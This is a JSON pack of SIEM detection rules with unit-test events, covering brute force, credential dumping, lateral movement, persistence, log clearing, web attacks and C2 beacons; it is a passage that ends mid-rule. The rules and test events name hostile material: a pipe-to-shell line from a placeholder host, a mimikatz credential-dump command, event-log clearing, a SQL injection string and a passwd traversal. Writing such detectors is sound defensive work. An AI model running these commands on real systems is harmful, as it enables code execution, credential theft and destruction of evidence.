{
  "packId": "socp-core-detections",
  "version": "2026.08.19",
  "schemaVersion": "1",
  "maintainer": "socp-detection",
  "rules": [
    {
      "id": "AUTH-BRUTE",
      "version": "1.1.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "同一源 IP 在短时间内连续失败登录。",
      "dataSources": ["auth", "sshd"],
      "mitre": ["T1110"],
      "references": ["https://attack.mitre.org/techniques/T1110/"],
      "spec": {
        "id": "AUTH-BRUTE",
        "name": "SSH 暴力破解",
        "type": "threshold",
        "severity": "HIGH",
        "message": "源 {key} 在 {window} 内失败登录 {count} 次",
        "keyField": "src_ip",
        "threshold": 5,
        "window": "60s",
        "mitre": "T1110",
        "match": [
          {"field": "source", "op": "eq", "value": "auth"},
          {"field": "msg", "op": "contains", "value": "Failed password"}
        ]
      },
      "tests": [
        {
          "name": "five failures trigger",
          "expectAlert": true,
          "events": [
            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.10"}},
            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.10"}},
            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.10"}},
            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.10"}},
            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.10"}}
          ]
        },
        {
          "name": "four failures do not trigger",
          "expectAlert": false,
          "events": [
            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.11"}},
            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.11"}},
            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.11"}},
            {"source": "auth", "host": "ssh-1", "msg": "Failed password", "fields": {"src_ip": "198.51.100.11"}}
          ]
        }
      ]
    },
    {
      "id": "AUTH-BRUTE-SUCCESS",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "失败登录后同一源 IP 成功登录，形成攻击链。",
      "dataSources": ["auth", "sshd"],
      "mitre": ["T1110", "T1078"],
      "references": ["https://attack.mitre.org/techniques/T1078/"],
      "spec": {
        "id": "AUTH-BRUTE-SUCCESS",
        "name": "暴力破解得手（关联）",
        "type": "correlation",
        "severity": "CRITICAL",
        "message": "源 {key} 在攻击链中疑似暴力破解得手",
        "keyField": "src_ip",
        "window": "120s",
        "mitre": "T1078",
        "steps": [
          [{"field": "source", "op": "eq", "value": "auth"}, {"field": "msg", "op": "contains", "value": "Failed password"}],
          [{"field": "source", "op": "eq", "value": "auth"}, {"field": "msg", "op": "contains", "value": "Accepted password"}]
        ]
      },
      "tests": [
        {
          "name": "failure followed by success triggers",
          "expectAlert": true,
          "events": [
            {"source": "auth", "host": "ssh-2", "msg": "Failed password", "fields": {"src_ip": "198.51.100.20"}},
            {"source": "auth", "host": "ssh-2", "msg": "Accepted password", "fields": {"src_ip": "198.51.100.20"}}
          ]
        },
        {
          "name": "success without failure does not trigger",
          "expectAlert": false,
          "events": [
            {"source": "auth", "host": "ssh-2", "msg": "Accepted password", "fields": {"src_ip": "198.51.100.21"}}
          ]
        }
      ]
    },
    {
      "id": "AUTH-PRIVESC",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "识别 sudo 或显式权限提升痕迹。",
      "dataSources": ["auth", "auditd", "linux"],
      "mitre": ["T1548"],
      "references": ["https://attack.mitre.org/techniques/T1548/"],
      "spec": {
        "id": "AUTH-PRIVESC",
        "name": "权限提升",
        "type": "pattern",
        "severity": "CRITICAL",
        "message": "检测到权限提升行为：{msg} @ {host}",
        "mitre": "T1548",
        "match": [{"field": "msg", "op": "regex", "value": "(?i)Privilege escalation|sudo:"}]
      },
      "tests": [
        {
          "name": "sudo command triggers",
          "expectAlert": true,
          "events": [{"source": "auth", "host": "linux-1", "msg": "sudo: user executed /bin/sh", "fields": {}}]
        },
        {
          "name": "ordinary login does not trigger",
          "expectAlert": false,
          "events": [{"source": "auth", "host": "linux-1", "msg": "Accepted password", "fields": {}}]
        }
      ]
    },
    {
      "id": "CRED-DUMP",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "识别常见凭据转储工具和敏感凭据文件访问。",
      "dataSources": ["edr", "auditd", "sysmon"],
      "mitre": ["T1003"],
      "references": ["https://attack.mitre.org/techniques/T1003/"],
      "spec": {
        "id": "CRED-DUMP",
        "name": "凭据转储",
        "type": "pattern",
        "severity": "CRITICAL",
        "message": "检测到凭据转储行为：{msg} @ {host}",
        "mitre": "T1003",
        "match": [{"field": "msg", "op": "regex", "value": "(?i)mimikatz|lsass|sekurlsa|ntds|/etc/shadow"}]
      },
      "tests": [
        {
          "name": "mimikatz triggers",
          "expectAlert": true,
          "events": [{"source": "edr", "host": "win-1", "msg": "mimikatz sekurlsa::logonpasswords", "fields": {}}]
        },
        {
          "name": "normal process does not trigger",
          "expectAlert": false,
          "events": [{"source": "edr", "host": "win-1", "msg": "explorer.exe started", "fields": {}}]
        }
      ]
    },
    {
      "id": "AUTH-NEW-ADMIN",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "Detect creation of a privileged local account.",
      "dataSources": ["linux", "auditd"],
      "mitre": ["T1098"],
      "references": ["https://attack.mitre.org/techniques/T1098/"],
      "spec": {"id": "AUTH-NEW-ADMIN", "name": "New privileged account", "type": "pattern", "severity": "HIGH", "message": "Privileged account change on {host}: {msg}", "mitre": "T1098", "match": [{"field": "msg", "op": "regex", "value": "(?i)(useradd|adduser).*(sudo|wheel|admin)|usermod.*(-aG|--append)"}]},
      "tests": [{"name": "admin group account", "expectAlert": true, "events": [{"source": "auditd", "host": "linux-1", "msg": "useradd admin to sudo group", "fields": {}}]}, {"name": "normal account", "expectAlert": false, "events": [{"source": "auditd", "host": "linux-1", "msg": "useradd service-account", "fields": {}}]}]
    },
    {
      "id": "AUTH-ROOT-LOGIN",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "Detect direct root authentication on managed hosts.",
      "dataSources": ["auth", "sshd"],
      "mitre": ["T1078"],
      "references": ["https://attack.mitre.org/techniques/T1078/"],
      "spec": {"id": "AUTH-ROOT-LOGIN", "name": "Direct root login", "type": "pattern", "severity": "HIGH", "message": "Root login on {host}: {msg}", "mitre": "T1078", "match": [{"field": "source", "op": "eq", "value": "auth"}, {"field": "msg", "op": "regex", "value": "(?i)(accepted|session opened).*root"}]},
      "tests": [{"name": "root accepted", "expectAlert": true, "events": [{"source": "auth", "host": "linux-2", "msg": "Accepted password for root", "fields": {}}]}, {"name": "user accepted", "expectAlert": false, "events": [{"source": "auth", "host": "linux-2", "msg": "Accepted password for alice", "fields": {}}]}]
    },
    {
      "id": "LATERAL-RDP",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "Repeated remote desktop attempts from one source.",
      "dataSources": ["firewall", "windows"],
      "mitre": ["T1021.001"],
      "references": ["https://attack.mitre.org/techniques/T1021/001/"],
      "spec": {"id": "LATERAL-RDP", "name": "RDP lateral movement", "type": "threshold", "severity": "HIGH", "message": "Source {key} made {count} RDP attempts in {window}", "keyField": "src_ip", "routingField": "src_ip", "threshold": 5, "window": "300s", "mitre": "T1021.001", "match": [{"field": "msg", "op": "regex", "value": "(?i)(rdp|mstsc|3389)"}]},
      "tests": [{"name": "five RDP attempts", "expectAlert": true, "events": [{"source": "firewall", "host": "dc-1", "msg": "RDP connection to 3389", "fields": {"src_ip": "198.51.100.30"}}, {"source": "firewall", "host": "dc-2", "msg": "RDP connection to 3389", "fields": {"src_ip": "198.51.100.30"}}, {"source": "firewall", "host": "dc-3", "msg": "RDP connection to 3389", "fields": {"src_ip": "198.51.100.30"}}, {"source": "firewall", "host": "dc-4", "msg": "RDP connection to 3389", "fields": {"src_ip": "198.51.100.30"}}, {"source": "firewall", "host": "dc-5", "msg": "RDP connection to 3389", "fields": {"src_ip": "198.51.100.30"}}]}, {"name": "single RDP attempt", "expectAlert": false, "events": [{"source": "firewall", "host": "dc-1", "msg": "RDP connection to 3389", "fields": {"src_ip": "198.51.100.31"}}]}]
    },
    {
      "id": "LATERAL-SMB",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "Repeated SMB or PsExec movement attempts.",
      "dataSources": ["firewall", "windows", "edr"],
      "mitre": ["T1021.002"],
      "references": ["https://attack.mitre.org/techniques/T1021/002/"],
      "spec": {"id": "LATERAL-SMB", "name": "SMB lateral movement", "type": "threshold", "severity": "HIGH", "message": "Source {key} made {count} SMB movement attempts", "keyField": "src_ip", "routingField": "src_ip", "threshold": 5, "window": "300s", "mitre": "T1021.002", "match": [{"field": "msg", "op": "regex", "value": "(?i)(smb|psexec|wmiexec|445)"}]},
      "tests": [{"name": "SMB burst", "expectAlert": true, "events": [{"source": "edr", "host": "srv-1", "msg": "psexec SMB session", "fields": {"src_ip": "198.51.100.40"}}, {"source": "edr", "host": "srv-2", "msg": "psexec SMB session", "fields": {"src_ip": "198.51.100.40"}}, {"source": "edr", "host": "srv-3", "msg": "psexec SMB session", "fields": {"src_ip": "198.51.100.40"}}, {"source": "edr", "host": "srv-4", "msg": "psexec SMB session", "fields": {"src_ip": "198.51.100.40"}}, {"source": "edr", "host": "srv-5", "msg": "psexec SMB session", "fields": {"src_ip": "198.51.100.40"}}]}, {"name": "ordinary file share", "expectAlert": false, "events": [{"source": "edr", "host": "srv-1", "msg": "SMB file read", "fields": {"src_ip": "198.51.100.41"}}]}]
    },
    {
      "id": "EXEC-POWERSHELL",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "Encoded or downloaded PowerShell execution.",
      "dataSources": ["sysmon", "edr"],
      "mitre": ["T1059.001"],
      "references": ["https://attack.mitre.org/techniques/T1059/001/"],
      "spec": {"id": "EXEC-POWERSHELL", "name": "Suspicious PowerShell", "type": "pattern", "severity": "HIGH", "message": "Suspicious PowerShell on {host}: {msg}", "mitre": "T1059.001", "match": [{"field": "msg", "op": "regex", "value": "(?i)powershell.*(-enc|-encodedcommand|downloadstring|invoke-expression)"}]},
      "tests": [{"name": "encoded PowerShell", "expectAlert": true, "events": [{"source": "sysmon", "host": "win-2", "msg": "powershell.exe -enc aGVsbG8=", "fields": {}}]}, {"name": "signed binary", "expectAlert": false, "events": [{"source": "sysmon", "host": "win-2", "msg": "powershell.exe -File backup.ps1", "fields": {}}]}]
    },
    {
      "id": "EXEC-SHELL",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "Shell execution through common interpreter abuse patterns.",
      "dataSources": ["auditd", "edr", "falco"],
      "mitre": ["T1059"],
      "references": ["https://attack.mitre.org/techniques/T1059/"],
      "spec": {"id": "EXEC-SHELL", "name": "Suspicious shell execution", "type": "pattern", "severity": "HIGH", "message": "Suspicious shell execution on {host}: {msg}", "mitre": "T1059", "match": [{"field": "msg", "op": "regex", "value": "(?i)(bash -c|sh -c|curl.*\\|.*sh|wget.*\\|.*sh)"}]},
      "tests": [{"name": "pipe to shell", "expectAlert": true, "events": [{"source": "auditd", "host": "linux-3", "msg": "curl http://x/payload | sh", "fields": {}}]}, {"name": "normal shell", "expectAlert": false, "events": [{"source": "auditd", "host": "linux-3", "msg": "bash /opt/backup.sh", "fields": {}}]}]
    },
    {
      "id": "PERSIST-CRON",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "Cron persistence or systemd timer creation.",
      "dataSources": ["auditd", "linux", "edr"],
      "mitre": ["T1053.003"],
      "references": ["https://attack.mitre.org/techniques/T1053/003/"],
      "spec": {"id": "PERSIST-CRON", "name": "Cron persistence", "type": "pattern", "severity": "HIGH", "message": "Persistence change on {host}: {msg}", "mitre": "T1053.003", "match": [{"field": "msg", "op": "regex", "value": "(?i)(crontab -e|/etc/cron|systemd-run|timer)"}]},
      "tests": [{"name": "crontab write", "expectAlert": true, "events": [{"source": "auditd", "host": "linux-4", "msg": "crontab -e added reverse shell", "fields": {}}]}, {"name": "cron daemon tick", "expectAlert": false, "events": [{"source": "linux", "host": "linux-4", "msg": "cron daemon started", "fields": {}}]}]
    },
    {
      "id": "PERSIST-TASK",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "Windows scheduled task persistence.",
      "dataSources": ["sysmon", "windows", "edr"],
      "mitre": ["T1053.005"],
      "references": ["https://attack.mitre.org/techniques/T1053/005/"],
      "spec": {"id": "PERSIST-TASK", "name": "Scheduled task persistence", "type": "pattern", "severity": "HIGH", "message": "Scheduled task persistence on {host}: {msg}", "mitre": "T1053.005", "match": [{"field": "msg", "op": "regex", "value": "(?i)(schtasks.*(/create|create)|scheduled task.*created)"}]},
      "tests": [{"name": "task create", "expectAlert": true, "events": [{"source": "sysmon", "host": "win-3", "msg": "schtasks /create /tn Update /tr powershell", "fields": {}}]}, {"name": "task run", "expectAlert": false, "events": [{"source": "sysmon", "host": "win-3", "msg": "scheduled task Update started", "fields": {}}]}]
    },
    {
      "id": "EVADE-LOGCLEAR",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "Clear or remove security logs.",
      "dataSources": ["windows", "auditd", "edr"],
      "mitre": ["T1070.001"],
      "references": ["https://attack.mitre.org/techniques/T1070/001/"],
      "spec": {"id": "EVADE-LOGCLEAR", "name": "Log clearing", "type": "pattern", "severity": "CRITICAL", "message": "Log clearing on {host}: {msg}", "mitre": "T1070.001", "match": [{"field": "msg", "op": "regex", "value": "(?i)(wevtutil cl|clear-eventlog|history -c|rm -f /var/log)"}]},
      "tests": [{"name": "wevtutil clear", "expectAlert": true, "events": [{"source": "windows", "host": "win-4", "msg": "wevtutil cl Security", "fields": {}}]}, {"name": "log rotate", "expectAlert": false, "events": [{"source": "linux", "host": "linux-5", "msg": "logrotate completed", "fields": {}}]}]
    },
    {
      "id": "IOC-BLOCKED-IP",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "Activity from an operator-maintained blocked IP list.",
      "dataSources": ["firewall", "proxy", "auth"],
      "mitre": ["T1071"],
      "references": ["https://attack.mitre.org/techniques/T1071/"],
      "spec": {"id": "IOC-BLOCKED-IP", "name": "Blocked IP activity", "type": "pattern", "severity": "CRITICAL", "message": "Blocked IP activity: {msg}", "mitre": "T1071", "match": [{"field": "src_ip", "op": "inlist", "value": "blocked_ips"}]},
      "tests": [{"name": "blocked address", "expectAlert": true, "events": [{"source": "firewall", "host": "fw-1", "msg": "connection denied", "fields": {"src_ip": "10.0.0.66"}}]}, {"name": "normal address", "expectAlert": false, "events": [{"source": "firewall", "host": "fw-1", "msg": "connection allowed", "fields": {"src_ip": "198.51.100.50"}}]}]
    },
    {
      "id": "WEB-SQLI",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "SQL injection indicators in web requests.",
      "dataSources": ["nginx", "waf", "web"],
      "mitre": ["T1190"],
      "references": ["https://attack.mitre.org/techniques/T1190/"],
      "spec": {"id": "WEB-SQLI", "name": "SQL injection", "type": "pattern", "severity": "HIGH", "message": "Possible SQL injection on {host}: {msg}", "mitre": "T1190", "match": [{"field": "source", "op": "eq", "value": "web"}, {"field": "msg", "op": "regex", "value": "(?i)(union\\s+select|sleep\\s*\\(|or\\s+1=1|select.*from)"}]},
      "tests": [{"name": "union select", "expectAlert": true, "events": [{"source": "web", "host": "web-1", "msg": "GET /?id=1 union select password from users", "fields": {}}]}, {"name": "normal query", "expectAlert": false, "events": [{"source": "web", "host": "web-1", "msg": "GET /health 200", "fields": {}}]}]
    },
    {
      "id": "WEB-TRAVERSAL",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "Directory traversal and sensitive file access.",
      "dataSources": ["nginx", "waf", "web"],
      "mitre": ["T1006"],
      "references": ["https://attack.mitre.org/techniques/T1006/"],
      "spec": {"id": "WEB-TRAVERSAL", "name": "Path traversal", "type": "pattern", "severity": "HIGH", "message": "Possible path traversal on {host}: {msg}", "mitre": "T1006", "match": [{"field": "msg", "op": "regex", "value": "(?i)(\\.\\./|%2e%2e|/etc/passwd|win.ini)"}]},
      "tests": [{"name": "passwd read", "expectAlert": true, "events": [{"source": "web", "host": "web-2", "msg": "GET /../../etc/passwd", "fields": {}}]}, {"name": "static asset", "expectAlert": false, "events": [{"source": "web", "host": "web-2", "msg": "GET /assets/app.js", "fields": {}}]}]
    },
    {
      "id": "C2-BEACON",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "Repeated command-and-control beacon indicators from one host.",
      "dataSources": ["proxy", "edr", "dns"],
      "mitre": ["T1071.001"],
      "references": ["https://attack.mitre.org/techniques/T1071/001/"],
      "spec": {"id": "C2-BEACON", "name": "C2 beacon", "type": "threshold", "severity": "HIGH", "message": "Host {key} emitted {count} C2 indicators", "keyField": "host", "routingField": "host", "threshold": 4, "window": "300s", "mitre": "T1071.001", "match": [{"field": "msg", "op": "regex", "value": "(?i)(beacon|cobaltstrike|command-and-control|periodic callback)"}]},
      "tests": [{"name": "beacon burst", "expectAlert": true, "events": [{"source": "proxy", "host": "endpoint-1", "msg": "periodic beacon callback", "fields": {}}, {"source": "proxy", "host": "endpoint-1", "msg": "periodic beacon callback", "fields": {}}, {"source": "proxy", "host": "endpoint-1", "msg": "periodic beacon callback", "fields": {}}, {"source": "proxy", "host": "endpoint-1", "msg": "periodic beacon callback", "fields": {}}]}, {"name": "normal proxy", "expectAlert": false, "events": [{"source": "proxy", "host": "endpoint-2", "msg": "GET /api/status 200", "fields": {}}]}]
    },
    {
      "id": "EXFIL-LARGE",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "Repeated large upload indicators from one source.",
      "dataSources": ["proxy", "netflow", "dlp"],
      "mitre": ["T1041"],
      "references": ["https://attack.mitre.org/techniques/T1041/"],
      "spec": {"id": "EXFIL-LARGE", "name": "Large data exfiltration", "type": "threshold", "severity": "HIGH", "message": "Source {key} generated {count} large uploads", "keyField": "src_ip", "routingField": "src_ip", "threshold": 3, "window": "300s", "mitre": "T1041", "match": [{"field": "msg", "op": "contains", "value": "large_upload"}]},
      "tests": [{"name": "three uploads", "expectAlert": true, "events": [{"source": "proxy", "host": "proxy-1", "msg": "large_upload 100MB", "fields": {"src_ip": "198.51.100.60"}}, {"source": "proxy", "host": "proxy-1", "msg": "large_upload 100MB", "fields": {"src_ip": "198.51.100.60"}}, {"source": "proxy", "host": "proxy-1", "msg": "large_upload 100MB", "fields": {"src_ip": "198.51.100.60"}}]}, {"name": "small upload", "expectAlert": false, "events": [{"source": "proxy", "host": "proxy-1", "msg": "upload 1MB", "fields": {"src_ip": "198.51.100.61"}}]}]
    },
    {
      "id": "DOS-FLOOD",
      "version": "1.0.0",
      "status": "ACTIVE",
      "owner": "socp-detection",
      "description": "High-volume flood indicators targeting one destination.",
      "dataSources": ["firewall", "netflow", "waf"],
      "mitre": ["T1498"],
      "references": ["https://attack.mitre.org/techniques/T1498/"],
      "spec": {"id": "DOS-FLOOD", "name": "Network flood", "type": "threshold", "severity": "HIGH", "message": "Destination {key} received {count} flood indicators", "keyField": "dst_ip", "routingField": "dst_ip", "threshold": 5, "window": "30s", "mitre": "T1498", "match": [{"field": "msg", "op": "contains", "value": "flood"}]},
